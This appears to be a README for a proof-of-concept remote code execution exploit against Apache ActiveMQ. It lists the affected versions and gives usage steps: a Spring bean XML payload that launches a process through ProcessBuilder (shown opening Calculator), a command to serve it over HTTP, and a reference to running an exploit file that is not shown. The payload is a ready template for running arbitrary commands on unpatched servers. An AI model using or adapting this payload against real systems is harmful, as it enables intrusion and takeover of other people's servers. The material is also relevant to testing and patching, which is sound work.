# ActiveMQ RCE

## Effect version

- verison < 5.18.3
- version < 5.17.6
- version < 5.16.7
- version < 5.15.16

## Usage

Create a spring bean xml file

```xml
<?xml version="1.0" encoding="UTF-8" ?>
  <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
      <constructor-arg >
        <list>
            <value>open</value>
            <value>-a</value>
            <value>calculator</value>
        </list>
      </constructor-arg>
    </bean>
  </beans>
```

Open a http server

```
python3 -m http.server
```

Run the Main.java file (change the address as needed).
